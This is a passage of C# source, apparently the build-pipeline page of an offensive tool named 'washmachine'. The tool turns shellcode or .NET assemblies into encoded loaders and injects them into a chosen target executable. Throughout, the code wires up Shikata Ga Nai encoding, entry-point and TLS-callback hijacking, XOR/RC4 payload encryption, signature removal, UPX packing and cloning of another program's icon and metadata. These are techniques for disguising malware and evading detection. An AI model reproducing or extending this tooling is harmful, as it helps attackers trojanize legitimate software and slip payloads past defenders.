                    return (null, false);
                }
                // If the source is a PE (.exe), strip/convert it to a temp .bin first
                if (Path.GetExtension(scFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                {
                    var peOpts = mainPage.GetPeSourceOptions();
                    var stripped = await StripExeShellcodeAsync(scFile, peOpts);
                    if (stripped == null) return (null, false);
                    scFile = stripped;
                }
                args.AddRange(["-s", scFile]);
                break;

            case ShellcodeSource.Raw:
                var hex = mainPage.ShellcodeRawTextBox.Text.Trim();
                if (string.IsNullOrEmpty(hex))
                {
                    _logger.Error("Raw shellcode is empty.");
                    return (null, false);
                }
                // Write hex to a temp .bin and pass as file
                var tempBin = Path.Combine(Path.GetTempPath(), $"wm_raw_{Guid.NewGuid():N}.bin");
                await File.WriteAllBytesAsync(tempBin, Convert.FromHexString(hex.Replace(" ", "").Replace("\n", "")));
                args.AddRange(["-s", tempBin]);
                break;

            case ShellcodeSource.Url:
                var url = mainPage.ShellcodeUrlTextBox.Text.Trim();
                if (string.IsNullOrEmpty(url))
                {
                    _logger.Error("Shellcode URL is empty.");
                    return (null, false);
                }
                args.AddRange(["-ShellcodeUrl", url]);
                break;

            default:
                _logger.Error($"Unsupported shellcode source: {mainPage.CurrentShellcodeSource}. Use File, Raw, or URL.");
                return (null, false);
        }

        // Template
        var templateId = mainPage.SelectedTemplateId;
        if (!string.IsNullOrEmpty(templateId))
            args.AddRange(["-t", templateId]);

        // Encoder index
        var encoderIndex = mainPage.SelectedEncoderIndex;
        if (encoderIndex.HasValue)
            args.AddRange(["-e", encoderIndex.Value.ToString()]);

        // Envelope index
        var envelopeIndex = mainPage.SelectedEnvelopeIndex;
        if (envelopeIndex.HasValue)
            args.AddRange(["-v", envelopeIndex.Value.ToString()]);

        if (mainPage.IsShikataGaNaiEnabled)
        {
            args.Add("-Sgn");
            args.AddRange(["-SgnCount", mainPage.ShikataGaNaiEncodeCount.ToString()]);
            args.AddRange(["-SgnMax", mainPage.ShikataGaNaiMaxBytes.ToString()]);
            args.AddRange(["-SgnPlacement", mainPage.ShikataGaNaiPlacement]);
        }

        // Snippets — read from coordinator's template options (combos live in the dialog, not the visual tree)
        var templateOptions = mainPage.Coordinator.TemplateOptions;
        foreach (var (key, value) in templateOptions.ComboValues)
        {
            if (!string.IsNullOrEmpty(value) && !value.Equals("None", StringComparison.OrdinalIgnoreCase))
            {
                var sectionKey = ExtractSnippetSectionKey(key);
                args.AddRange(["-Snippet", $"{sectionKey}={value}"]);
                _logger.Debug($"[ui] snippet combo: {sectionKey}={value}");
            }
        }
        foreach (var (key, values) in templateOptions.ListValues)
        {
            if (values is { Count: > 0 })
            {
                var sectionKey = ExtractSnippetSectionKey(key);
                args.AddRange(["-Snippet", $"{sectionKey}={string.Join(",", values)}"]);
                _logger.Debug($"[ui] snippet list: {sectionKey}={string.Join(",", values)}");
            }
        }
        foreach (var (key, value) in templateOptions.TextValues)
        {
            if (!string.IsNullOrEmpty(value))
            {
                args.AddRange(["-Text", $"{key}={value}"]);
                _logger.Debug($"[ui] text: {key}={value}");
            }
        }

        if (finalizePage is { IsFinalizationEnabled: true })
        {
            if (finalizePage.IsCloneEnabled && !string.IsNullOrWhiteSpace(finalizePage.CloneSourceExePath))
            {
                args.AddRange(["-CloneFrom", finalizePage.CloneSourceExePath]);
                args.Add(finalizePage.CloneResources ? "-CloneResources" : "-NoCloneResources");
                args.Add(finalizePage.CloneIcon ? "-CloneIcon" : "-NoCloneIcon");
                args.Add(finalizePage.CloneMetadata ? "-CloneMetadata" : "-NoCloneMetadata");
            }

            if (finalizePage.NopPaddingBytes > 0)
            {
                args.AddRange(["-PadNops", finalizePage.NopPaddingBytes.ToString()]);
            }
        }

        // Verbose output
        if (VerboseBuildCheck.IsChecked == true)
            args.Add("-Verbose");

        // Compilation backend + compilation-flow controls.
        // Flow controls are LLVM-pipeline scoped — the deterministic CLI path does
        // not yet understand these flags, so only emit them for LLVM builds.
        var backend = GetSelectedCompilationBackend();
        bool isLlvmBackend = !backend.Equals("Deterministic", StringComparison.OrdinalIgnoreCase);

        if (isLlvmBackend)
        {
            args.AddRange(["-Backend", backend]);
            foreach (var passId in GetSelectedLlvmPassIds())
                args.AddRange(["-LlvmPass", passId]);

            var toolchain = GetSelectedLlvmToolchainMode();
            if (!toolchain.Equals("auto", StringComparison.OrdinalIgnoreCase))
                args.AddRange(["-LlvmToolchain", toolchain]);

            args.AddRange(["-OptLevel", GetTag(OptimizationCombo, "O2")]);
            args.AddRange(["-Arch", GetTag(ArchitectureCombo, "x64")]);
            args.AddRange(["-Subsystem", GetTag(SubsystemCombo, "windows")]);
            args.AddRange(["-CppStandard", GetTag(CppStandardCombo, "17")]);

            foreach (var define in SplitDefines(DefinesTextBox?.Text))
                args.AddRange(["-Define", define]);

            foreach (var flag in SplitExtraFlags(ExtraFlagsTextBox?.Text))
                args.AddRange(["-ExtraFlag", flag]);

            if (StripSymbolsCheck?.IsChecked == true)
                args.Add("-StripSymbols");
            if (LtoCheck?.IsChecked == true)
                args.Add("-Lto");
            if (GcSectionsCheck?.IsChecked == false)
                args.Add("-NoGcSections");
            if (GenerateDebugInfo?.IsChecked == true)
                args.Add("-Debug");
        }

        // JSON output for machine-readable result
        args.Add("-Json");

        _logger.Info($"CLI: washmachine-cli {string.Join(" ", args.Select(a => a.Contains(' ') ? $"\"{a}\"" : a))}");

        // Capture JSON from stdout, other lines to log
        string? jsonLine = null;
        var result = await _cli.RunAsync(args, line =>
        {
            if (line.TrimStart().StartsWith('{'))
                jsonLine = line;
            else
                _logger.Info(line);
        });

        // If single-line capture is missing or incomplete, extract from full output
        bool incomplete = jsonLine == null || !jsonLine.TrimEnd().EndsWith('}');
        if (incomplete && result.OutputLines.Count > 0)
        {
            var fullOutput = result.Output;
            var start = fullOutput.IndexOf('{');
            var end   = fullOutput.LastIndexOf('}');
            if (start >= 0 && end > start)
                jsonLine = fullOutput[start..(end + 1)];
        }

        if (jsonLine == null)
        {
            _logger.Error("No JSON output from CLI compile.");
            return (null, false);
        }

        try
        {
            using var doc = System.Text.Json.JsonDocument.Parse(jsonLine);
            var root = doc.RootElement;

            var success      = root.TryGetProperty("Success", out var sv) && sv.GetBoolean();
            var exePath      = root.TryGetProperty("OutputExePath", out var ep) ? ep.GetString() : null;
            var convSuccess  = root.TryGetProperty("ConversionSuccess", out var cv) && cv.GetBoolean();
            var convError    = root.TryGetProperty("ConversionError", out var ce) ? ce.GetString() : null;

            if (!convSuccess && !string.IsNullOrEmpty(convError))
                _logger.Error($"Compiler: {convError}");

            if (!success || string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
                return (null, false);

            return (exePath, true);
        }
        catch (Exception ex)
        {
            _logger.Error($"Failed to parse CLI output: {ex.Message}");
            _logger.Info(jsonLine);
            return (null, false);
        }
    }

    /// <summary>
    /// Resolves the original raw shellcode .bin path from the current MainPage configuration.
    /// For File source: returns the file path directly.
    /// For Raw source: writes hex to a temp .bin file.
    /// For URL source: not supported (returns null).
    /// </summary>
    private string? ResolveOriginalShellcodePath(MainPage mainPage)
    {
        switch (mainPage.CurrentShellcodeSource)
        {
            case ShellcodeSource.File:
                var scFile = mainPage.ShellcodeFileTextBox.Text.Trim();
                if (!string.IsNullOrEmpty(scFile) && File.Exists(scFile))
                    return scFile;
                _logger.Warn($"Shellcode file not found: {scFile}");
                return null;

            case ShellcodeSource.Raw:
                var hex = mainPage.ShellcodeRawTextBox.Text.Trim();
                if (string.IsNullOrEmpty(hex)) return null;
                try
                {
                    var tempBin = Path.Combine(Path.GetTempPath(), $"wm_raw_{Guid.NewGuid():N}.bin");
                    File.WriteAllBytes(tempBin, Convert.FromHexString(hex.Replace(" ", "").Replace("\n", "").Replace("\r", "")));
                    return tempBin;
                }
                catch (Exception ex)
                {
                    _logger.Error($"Failed to write raw shellcode: {ex.Message}");
                    return null;
                }

            default:
                _logger.Warn($"Shellcode source '{mainPage.CurrentShellcodeSource}' not supported for direct backdooring.");
                return null;
        }
    }

    /// <summary>
    /// Run SGN on the stripped loader .bin, producing a parallel .sgn.bin next to it.
    /// This is the "post-Bin2Shell" SGN placement: the loader itself is unmodified,
    /// but an additional SGN-wrapped artifact is emitted for external injection.
    /// </summary>
    private async Task<string?> RunPostSgnStepAsync(string strippedBinPath, int encodeCount, int maxBytes)
    {
        var sgnExe = _paths.SgnExecutable;
        var candidates = new List<string>();
        if (!string.IsNullOrWhiteSpace(sgnExe)) candidates.Add(sgnExe!);
        candidates.Add("sgn.exe");
        candidates.Add("sgn");

        var baseName = Path.GetFileNameWithoutExtension(strippedBinPath);
        var outDir = Path.GetDirectoryName(strippedBinPath) ?? Path.GetTempPath();
        var outPath = Path.Combine(outDir, $"{baseName}.sgn.bin");

        foreach (var candidate in candidates)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = candidate,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                psi.ArgumentList.Add("-i"); psi.ArgumentList.Add(strippedBinPath);
                psi.ArgumentList.Add("-o"); psi.ArgumentList.Add(outPath);
                psi.ArgumentList.Add("-a"); psi.ArgumentList.Add("64");
                psi.ArgumentList.Add("-c"); psi.ArgumentList.Add(encodeCount.ToString());
                psi.ArgumentList.Add("-M"); psi.ArgumentList.Add(maxBytes.ToString());

                _logger.Info($"  sgn -i <bin> -o <out> -a 64 -c {encodeCount} -M {maxBytes}");

                using var process = Process.Start(psi);
                if (process == null) continue;

                var stdoutTask = process.StandardOutput.ReadToEndAsync();
                var stderrTask = process.StandardError.ReadToEndAsync();
                await process.WaitForExitAsync();

                var stderr = await stderrTask;
                var stdout = await stdoutTask;

                if (process.ExitCode == 0 && File.Exists(outPath))
                    return outPath;

                _logger.Warn($"SGN exit {process.ExitCode}: {(string.IsNullOrWhiteSpace(stderr) ? stdout : stderr)}");
                return null;
            }
            catch (System.ComponentModel.Win32Exception ex) when (ex.NativeErrorCode is 2 or 3)
            {
                // Not found — try the next candidate.
                continue;
            }
            catch (Exception ex)
            {
                _logger.Error($"SGN process failed: {ex.Message}");
                return null;
            }
        }

        _logger.Warn("SGN executable not found. Run 'washmachine-cli provision' or install SGN.");
        return null;
    }

    /// <summary>
    /// Strip a compiled loader .exe into a flat .bin suitable for injection.
    /// </summary>
    private async Task<string?> RunStripStepAsync(string compiledExe, string outputDir)
    {
        if (!_cli.IsAvailable)
        {
            _logger.Warn("CLI not available — strip step skipped.");
            return null;
        }

        var binName = Path.GetFileNameWithoutExtension(compiledExe) + ".bin";
        var outBin = Path.Combine(outputDir, binName);

        var args = new List<string>
        {
            "strip",
            "-Pe", compiledExe,
            "-Output", outBin,
            "-Mode", "ep",
        };

        var result = await _cli.RunAsync(args, line => _logger.Info(line));

        if (result.Success && File.Exists(outBin))
        {
            var size = new FileInfo(outBin).Length;
            _logger.Info($"Stripped {Path.GetFileName(compiledExe)} → {binName} ({size:N0} bytes)");
            return outBin;
        }

        _logger.Warn($"Strip failed (exit {result.ExitCode}).");
        return null;
    }

    private async Task<string?> RunBackdoorStepAsync(
        BackdooringPage backdoorPage,
        string shellcodeBinPath,
        string outputDir)
    {
        var targetPe = backdoorPage.TargetPeFilePath;
        if (targetPe == null) return null;

        if (!backdoorPage.IsInjectionValid)
        {
            _logger.Warn("Backdoor configuration is currently invalid — skipping backdoor step.");
            return null;
        }

        if (!File.Exists(shellcodeBinPath))
        {
            _logger.Warn($"Shellcode binary not found: {shellcodeBinPath} — skipping.");
            return null;
        }

        if (!_cli.IsAvailable)
        {
            _logger.Warn("CLI not available — backdoor step skipped.");
            return null;
        }

        var outFile = Path.Combine(outputDir, "backdoored_" + Path.GetFileName(targetPe));

        var args = new List<string>
        {
            "backdoor",
            "-Pe",        targetPe,
            "-Shellcode", shellcodeBinPath,
            "-Output",    outFile,
        };

        // Pass GUI-selected options to CLI
        var method = backdoorPage.SelectedInjectionMethod switch
        {
            InjectionMethod.CodeCave => "code-cave",
            InjectionMethod.NewSection => "new-section",
            InjectionMethod.SectionExtension => "section-ext",
            _ => "code-cave"
        };
        args.AddRange(new[] { "-Method", method });

        if (!backdoorPage.RemoveSignature)
            args.Add("-NoRemoveSig");
        if (!backdoorPage.PatchSubsystemToGui)
            args.Add("-NoPatchSubsystem");
        if (!backdoorPage.PreserveOriginalEntry)
            args.Add("-NoPreserveEntry");
        if (!backdoorPage.PatchIat)
            args.Add("-NoPatchIat");

        // Carrier invoke method
        var carrierStr = backdoorPage.SelectedCarrierInvoke switch
        {
            CarrierInvoke.EntryPointHijack => "entry-point",
            CarrierInvoke.EntryFunctionBackdoor => "function-backdoor",
            CarrierInvoke.TlsCallback => "tls",
            _ => "entry-point"
        };
        args.AddRange(new[] { "-Carrier", carrierStr });

        // Encryption
        if (backdoorPage.SelectedEncryption != PayloadEncryption.None)
        {
            var encStr = backdoorPage.SelectedEncryption switch
            {
                PayloadEncryption.Xor  => "xor",
                PayloadEncryption.Xor2 => "xor2",
                PayloadEncryption.Rc4  => "rc4",
                _                      => "none"
            };
            args.AddRange(["-Encryption", encStr]);
            if (backdoorPage.XorKey is { } xorKey)
                args.AddRange(["-XorKey", xorKey]);
        }

        // Patch-exit
        if (!backdoorPage.PatchExit)
            args.Add("-NoPatchExit");

        // Section name
        if (backdoorPage.CustomSectionName is { } sectionName)
            args.AddRange(["-SectionName", sectionName]);

        // Cave min size
        if (backdoorPage.CaveMinSize != 64)
            args.AddRange(["-CaveMinSize", backdoorPage.CaveMinSize.ToString()]);

        // Dry run
        if (backdoorPage.DryRun)
            args.Add("-DryRun");

        var result = await _cli.RunAsync(args, line => _logger.Info(line));

        if (result.Success && File.Exists(outFile))
        {
            _logger.Ok($"Backdoored: {Path.GetFileName(outFile)}");
            return outFile;
        }

        _logger.Warn($"Backdooring failed (exit {result.ExitCode}).");
        return null;
    }

    private async Task<string?> RunPackingStepAsync(
        PackingPage packingPage,
        string currentExe,
        string outputDir)
    {
        var upxPath = packingPage.UpxPath;
        if (string.IsNullOrEmpty(upxPath)) return null;

        var packedOutput = Path.Combine(outputDir, "packed_" + Path.GetFileName(currentExe));
        var upxArgs = packingPage.GetUpxArguments();

        async Task<(int ExitCode, string Output, string Error)> RunUpxAsync(string args)
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = upxPath,
                Arguments              = $"{args} -o \"{packedOutput}\" \"{currentExe}\"",
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
            };

            using var proc = System.Diagnostics.Process.Start(psi);
            if (proc == null)
                return (-1, string.Empty, "Failed to start UPX process.");

            var output = await proc.StandardOutput.ReadToEndAsync();
            var error  = await proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            return (proc.ExitCode, output, error);
        }

        var (exitCode, output, error) = await RunUpxAsync(upxArgs);

        if (exitCode != 0 &&
            upxArgs.Contains("--strip-relocs", StringComparison.OrdinalIgnoreCase) &&
            error.Contains("--strip-relocs is not allowed with ASLR", StringComparison.OrdinalIgnoreCase))
        {
            _logger.Warn("UPX --strip-relocs is incompatible with ASLR binaries. Retrying without --strip-relocs...");
            var retryArgs = string.Join(" ",
                upxArgs
                    .Split(' ', StringSplitOptions.RemoveEmptyEntries)
                    .Where(arg => !arg.Equals("--strip-relocs", StringComparison.OrdinalIgnoreCase)));

            (exitCode, output, error) = await RunUpxAsync(retryArgs);
        }

        if (exitCode == 0 && File.Exists(packedOutput))
        {
            _logger.Ok($"Packed: {Path.GetFileName(packedOutput)}");
            if (!string.IsNullOrWhiteSpace(output)) _logger.Info(output);
            return packedOutput;
        }

        _logger.Warn($"UPX packing failed: {error}");
        return null;
    }

    // Heuristic thresholds for warning the user after a strip:
    //   - Below this size the result is almost certainly not real shellcode (just a stub).
    //   - Above this size the resulting C array trips MSVC's C1060 "out of heap" error.
    private const long SuspiciousMinStripSize = 64;
    private const long LargeStripWarnSize     = 1 * 1024 * 1024;

    /// <summary>
    /// Resolves the user's input .exe shellcode source to a flat <c>.bin</c> in the temp folder.
    /// Routes managed (.NET) inputs through donut and native shellcode-format PEs through the
    /// CLI <c>strip</c> command. Returns the temp file path on success, <c>null</c> on failure.
    /// </summary>
    private async Task<string?> StripExeShellcodeAsync(string exePath, PeSourceOptions peOpts)
    {
        var tempBin = Path.Combine(Path.GetTempPath(), $"wm_strip_{Guid.NewGuid():N}.bin");

        return peOpts.IsDonutConversion
            ? await ConvertManagedPeWithDonutAsync(exePath, tempBin, peOpts)
            : await StripNativePeWithCliAsync(exePath, tempBin, peOpts);
    }

    /// <summary>Run donut.exe to convert a managed .NET assembly to PIC shellcode.</summary>
    private async Task<string?> ConvertManagedPeWithDonutAsync(string exePath, string tempBin, PeSourceOptions peOpts)
    {
        var donutSvc = new DonutService(_paths.DonutExecutable, _logger);
        if (!donutSvc.IsAvailable)
        {
            _logger.Error("donut.exe not found. Provision optional tools from the Settings page to download Donut.");
            return null;
        }

        var opts = new DonutOptions
        {
            InputPath  = exePath,
            OutputPath = tempBin,
            Arch       = peOpts.DonutArch,
            Class      = peOpts.DonutClass,
            Method     = peOpts.DonutMethod,
            Params     = peOpts.DonutParams,
        };

        _logger.Info($"Converting .NET assembly to shellcode via donut (arch={opts.Arch})...");
        var donutResult = await donutSvc.ConvertAsync(opts);

        if (!donutResult.Success || !File.Exists(tempBin))
        {
            _logger.Error($"Donut conversion failed: {donutResult.Error}");
            return null;
        }

        var size = new FileInfo(tempBin).Length;
        _logger.Ok($"Donut conversion complete → temp .bin ({size:N0} bytes)");
        return tempBin;
    }

    /// <summary>Shell out to the CLI to strip a native shellcode-format PE down to flat bytes.</summary>
    private async Task<string?> StripNativePeWithCliAsync(string exePath, string tempBin, PeSourceOptions peOpts)
    {
        if (!_cli.IsAvailable)
        {
            _logger.Error("CLI not available — cannot strip PE shellcode source.");
            return null;
        }

        var args = BuildStripArgs(exePath, tempBin, peOpts);

        _logger.Info($"Stripping PE shellcode source ({peOpts.PeStripMode})...");
        var result = await _cli.RunAsync(args, line => _logger.Info(line));

        if (!result.Success || !File.Exists(tempBin))
        {
            _logger.Error($"PE strip failed (exit {result.ExitCode}).");
            return null;
        }

        var size = new FileInfo(tempBin).Length;
        _logger.Ok($"Stripped PE → temp .bin ({size:N0} bytes)");
        WarnIfStripSizeUnusual(size);
        return tempBin;
    }

    private static List<string> BuildStripArgs(string exePath, string tempBin, PeSourceOptions peOpts)
    {
        var args = new List<string> { "strip", "-Pe", exePath, "-Output", tempBin };

        // ep is the CLI default — only spell it out if the user picked something else.
        var mode = peOpts.PeStripMode;
        if (!string.Equals(mode, PeStripModes.EntryPoint, StringComparison.OrdinalIgnoreCase))
            args.AddRange(["-Mode", mode]);

        if (string.Equals(mode, PeStripModes.Section, StringComparison.OrdinalIgnoreCase)
            && !string.IsNullOrWhiteSpace(peOpts.PeStripSection))
            args.AddRange(["-Section", peOpts.PeStripSection]);

        // CLI trims by default; pass -NoTrim only when the user opted out.
        if (!peOpts.PeStripTrimTrailingZeros)
            args.Add("-NoTrim");

        return args;
    }

    /// <summary>Surface a hint when the stripped output is suspiciously tiny or alarmingly large.</summary>
    private void WarnIfStripSizeUnusual(long size)
    {
        if (size < SuspiciousMinStripSize)
        {
            _logger.Warn($"Stripped binary is only {size} bytes — this PE is almost certainly not a shellcode-format " +
                         "executable. Use raw shellcode (.bin from msfvenom -f raw) instead.");
        }
        else if (size > LargeStripWarnSize)
        {
            _logger.Warn($"Stripped binary is large ({size / 1024:N0} KB). MSVC may fail with " +
                         "C1060 (out of heap space). Try 'Entry point to end' mode or a smaller source file.");
        }
    }

    /// <summary>
    /// Extracts the snippet section key from a snippet control name.
    /// Control names follow the format snippetCombo_{SectionKey}_{index} or snippetList_{SectionKey}_{index}.
    /// </summary>
    private static string ExtractSnippetSectionKey(string controlName)
    {
        const string comboPrefix = "snippetCombo_";
        const string listPrefix = "snippetList_";

        string? prefix = controlName.StartsWith(comboPrefix, StringComparison.OrdinalIgnoreCase) ? comboPrefix
                       : controlName.StartsWith(listPrefix, StringComparison.OrdinalIgnoreCase) ? listPrefix
                       : null;
        if (prefix == null)
            return controlName;

        var withoutPrefix = controlName[prefix.Length..];
        var lastUnderscore = withoutPrefix.LastIndexOf('_');
        if (lastUnderscore > 0 && withoutPrefix[(lastUnderscore + 1)..].All(char.IsDigit))
            return withoutPrefix[..lastUnderscore];
        return withoutPrefix;
    }

    private void ShowCompileResult(bool success, string message)
    {
        CompileResultPanel.Visibility = Visibility.Visible;
        CompileResultText.Text = message;
        
        if (success)
        {
            CompileResultIcon.Glyph = "\uE73E"; // Checkmark
            CompileResultIcon.Foreground = App.ThemeBrush("DraculaGreenBrush");
            CompileOutputLink.Visibility = Visibility.Visible;
        }
        else
        {
            CompileResultIcon.Glyph = "\uEA39"; // Warning
            CompileResultIcon.Foreground = App.ThemeBrush("DraculaOrangeBrush");
            CompileOutputLink.Visibility = Visibility.Collapsed;
        }
    }

    private void OpenOutputFolder_Click(object sender, RoutedEventArgs e)
    {
        if (!string.IsNullOrEmpty(_lastOutputPath) && Directory.Exists(_lastOutputPath))
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _lastOutputPath,
                UseShellExecute = true
            });
        }
    }

    private void OpenPipelinePage_Click(object sender, RoutedEventArgs e)
    {
        if (App.ActiveWindow is MainWindow mw)
            mw.NavigateToPipeline();
    }


    // ═══════════════════════════════════════════════════════════════════════
    //  Recipe export / import
    // ═══════════════════════════════════════════════════════════════════════

    public async Task<bool> ExportRecipeAsync(IntPtr ownerHwnd)
    {
        var recipe = CaptureRecipe();
        var json = JsonSerializer.Serialize(recipe, new JsonSerializerOptions { WriteIndented = true });

        var picker = new FileSavePicker();
        picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
        picker.SuggestedFileName = $"washmachine_recipe_{DateTime.Now:yyyyMMdd_HHmmss}.json";
        picker.FileTypeChoices.Add("Washmachine Recipe", new List<string> { ".json" });

        InitializeWithWindow.Initialize(picker, ownerHwnd);

        var file = await picker.PickSaveFileAsync();
        if (file == null) return false;

        try
        {
            await File.WriteAllTextAsync(file.Path, json);
            _logger.Ok($"Recipe exported: {Path.GetFileName(file.Path)}");
            return true;
        }
        catch (Exception ex)
        {
            _logger.Error($"Failed to export recipe: {ex.Message}");
            return false;
        }
    }

    public async Task<bool> ImportRecipeAsync(IntPtr ownerHwnd)
    {
        var picker = new FileOpenPicker();
        picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
        picker.FileTypeFilter.Add(".json");

        InitializeWithWindow.Initialize(picker, ownerHwnd);

        var file = await picker.PickSingleFileAsync();
        if (file == null) return false;

        try
        {
            var json = await File.ReadAllTextAsync(file.Path);
            var recipe = JsonSerializer.Deserialize<PipelineRecipe>(json);
            if (recipe == null)
            {
                _logger.Error("Recipe file is empty or malformed.");
                return false;
            }
            ApplyRecipe(recipe);
            _logger.Ok($"Recipe imported: {Path.GetFileName(file.Path)}");
            UpdateConfigurationSummary();
            return true;
        }
        catch (Exception ex)
        {
            _logger.Error($"Failed to import recipe: {ex.Message}");
            return false;
        }
    }

    public PipelineRecipe CaptureRecipe()
    {
        var mainPage     = MainPage.Instance;
        var backdoorPage = BackdooringPage.Instance;
        var packingPage  = PackingPage.Instance;
        var finalizePage = FinalizePage.Instance;

        var recipe = new PipelineRecipe
        {
            Version = 1,
            CreatedAt = DateTime.UtcNow,
        };

        if (mainPage != null)
        {
            recipe.Payload = new PayloadRecipe
            {
                Source = mainPage.CurrentShellcodeSource.ToString(),
                File = mainPage.ShellcodeFileTextBox.Text,
                RawHex = mainPage.ShellcodeRawTextBox.Text,
                Url = mainPage.ShellcodeUrlTextBox.Text,
                Generic = mainPage.GenericShellcodeCombo.SelectedItem?.ToString(),
                TemplateId = mainPage.SelectedTemplateId,
                EncoderIndex = mainPage.SelectedEncoderIndex,
                EnvelopeIndex = mainPage.SelectedEnvelopeIndex,
                SgnEnabled = mainPage.IsShikataGaNaiEnabled,
                SgnEncodeCount = mainPage.ShikataGaNaiEncodeCount,
                SgnMaxBytes = mainPage.ShikataGaNaiMaxBytes,
                SgnPlacement = mainPage.ShikataGaNaiPlacement,
            };

            var opts = mainPage.Coordinator?.TemplateOptions;
            if (opts != null)
            {
                foreach (var kv in opts.ComboValues) recipe.Payload.SnippetCombos[kv.Key] = kv.Value;
                foreach (var kv in opts.TextValues) recipe.Payload.SnippetTexts[kv.Key] = kv.Value;
                foreach (var kv in opts.ListValues) recipe.Payload.SnippetLists[kv.Key] = new List<string>(kv.Value ?? new List<string>());
            }
        }

        if (backdoorPage != null)
        {
            recipe.Backdoor = new BackdoorRecipe
            {
                Enabled = backdoorPage.IsBackdooringEnabled,
                TargetPePath = backdoorPage.TargetPeFilePath,
                InjectionMethod = backdoorPage.SelectedInjectionMethod.ToString(),
                CarrierInvoke = backdoorPage.SelectedCarrierInvoke.ToString(),
                PreserveEntry = backdoorPage.PreserveOriginalEntry,
                PatchIat = backdoorPage.PatchIat,
                RemoveSignature = backdoorPage.RemoveSignature,
                PatchSubsystem = backdoorPage.PatchSubsystemToGui,
                PatchExit = backdoorPage.PatchExit,
                DryRun = backdoorPage.DryRun,
                XorKey = backdoorPage.XorKey,
                SectionName = backdoorPage.CustomSectionName,
                CaveMinSize = backdoorPage.CaveMinSize,
                Encryption = backdoorPage.SelectedEncryption.ToString(),
            };
        }

        if (packingPage != null)
        {
            recipe.Packing = new PackingRecipe
            {
                Enabled = packingPage.IsPackingEnabled,
                CompressionLevel = packingPage.SelectedCompressionLevel,
                UpxArgs = packingPage.GetUpxArguments(),
            };
        }

        if (finalizePage != null)
        {
            recipe.Finalize = new FinalizeRecipe
            {
                Enabled = finalizePage.IsFinalizationEnabled,
                CloneEnabled = finalizePage.IsCloneEnabled,
                CloneSource = finalizePage.CloneSourceExePath,
                CloneResources = finalizePage.CloneResources,
                CloneIcon = finalizePage.CloneIcon,
                CloneMetadata = finalizePage.CloneMetadata,
                NopPaddingBytes = finalizePage.NopPaddingBytes,
            };
        }

        recipe.Compile = new CompileRecipe
        {
            OutputPath = OutputPath?.Text,
            OpenFolderAfter = OpenFolderAfterCompile?.IsChecked == true,
            GenerateDebugInfo = GenerateDebugInfo?.IsChecked == true,
            StripToBin = StripToBinCheck?.IsChecked == true,
            Verbose = VerboseBuildCheck?.IsChecked == true,
        };

        return recipe;
    }

    public void ApplyRecipe(PipelineRecipe recipe)
    {
        var mainPage     = MainPage.Instance;
        var backdoorPage = BackdooringPage.Instance;
        var packingPage  = PackingPage.Instance;
        var finalizePage = FinalizePage.Instance;

        if (mainPage != null && recipe.Payload != null)
        {
            if (!string.IsNullOrEmpty(recipe.Payload.File))
                mainPage.ShellcodeFileTextBox.Text = recipe.Payload.File;
            if (!string.IsNullOrEmpty(recipe.Payload.RawHex))
                mainPage.ShellcodeRawTextBox.Text = recipe.Payload.RawHex;
            if (!string.IsNullOrEmpty(recipe.Payload.Url))
                mainPage.ShellcodeUrlTextBox.Text = recipe.Payload.Url;

            // Best-effort: apply SGN state by finding the checkbox/radios on MainPage
            mainPage.ApplySgnRecipe(
                recipe.Payload.SgnEnabled,
                recipe.Payload.SgnEncodeCount,
                recipe.Payload.SgnMaxBytes,
                recipe.Payload.SgnPlacement);

            // Template + encoder/envelope are best-effort from display text lookup
            mainPage.ApplyTemplateAndEncoding(
                recipe.Payload.TemplateId,
                recipe.Payload.EncoderIndex,
                recipe.Payload.EnvelopeIndex);

            var opts = mainPage.Coordinator?.TemplateOptions;
            if (opts != null && recipe.Payload.SnippetCombos.Count + recipe.Payload.SnippetTexts.Count + recipe.Payload.SnippetLists.Count > 0)
            {
                opts.ComboValues.Clear();
                foreach (var kv in recipe.Payload.SnippetCombos) opts.ComboValues[kv.Key] = kv.Value;
                opts.TextValues.Clear();
                foreach (var kv in recipe.Payload.SnippetTexts) opts.TextValues[kv.Key] = kv.Value;
                opts.ListValues.Clear();
                foreach (var kv in recipe.Payload.SnippetLists) opts.ListValues[kv.Key] = new List<string>(kv.Value ?? new List<string>());
            }
        }

        if (backdoorPage != null && recipe.Backdoor != null)
        {
            backdoorPage.ApplyRecipe(recipe.Backdoor);
        }

        if (packingPage != null && recipe.Packing != null)
        {
            packingPage.ApplyRecipe(recipe.Packing);
        }

        if (finalizePage != null && recipe.Finalize != null)
        {
            finalizePage.ApplyRecipe(recipe.Finalize);
        }

        if (recipe.Compile != null)
        {
            if (OutputPath != null) OutputPath.Text = recipe.Compile.OutputPath ?? "";
            if (OpenFolderAfterCompile != null) OpenFolderAfterCompile.IsChecked = recipe.Compile.OpenFolderAfter;
            if (GenerateDebugInfo != null) GenerateDebugInfo.IsChecked = recipe.Compile.GenerateDebugInfo;
            if (StripToBinCheck != null) StripToBinCheck.IsChecked = recipe.Compile.StripToBin;
            if (VerboseBuildCheck != null) VerboseBuildCheck.IsChecked = recipe.Compile.Verbose;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════
//  Compiler-card view-model (drives the ListView template)
// ═══════════════════════════════════════════════════════════════════════

public sealed class CompilerCardViewModel
{
    public string Kind { get; init; } = string.Empty;
    public string Path { get; init; } = string.Empty;
    public string Edition { get; init; } = string.Empty;
    public string Glyph { get; init; } = "";
    public string BackendBadge { get; init; } = "DETERMINISTIC";
    public bool IsLlvm { get; init; }

    /// <summary>Solid brush used for the rounded icon background.</summary>
    public SolidColorBrush AccentBrush { get; init; } = new(Microsoft.UI.Colors.SlateGray);

    /// <summary>Solid brush used for the backend badge — green for deterministic, purple for LLVM.</summary>
    public SolidColorBrush BackendBadgeBrush { get; init; } = new(Microsoft.UI.Colors.DimGray);

    public static CompilerCardViewModel FromCandidate(CompilerToolCandidate c)
    {
